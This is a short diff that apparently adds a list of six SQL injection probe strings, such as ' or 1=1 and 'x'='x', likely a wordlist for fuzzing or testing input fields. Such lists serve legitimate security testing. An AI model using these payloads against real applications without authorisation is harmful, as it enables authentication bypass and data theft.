@@ -1,0 +1,6 @@
+'
+' or 1=1
+sutton' or '1' = '1
+'sutton' or 'x'='x'
+' or like '%
+'%20OR
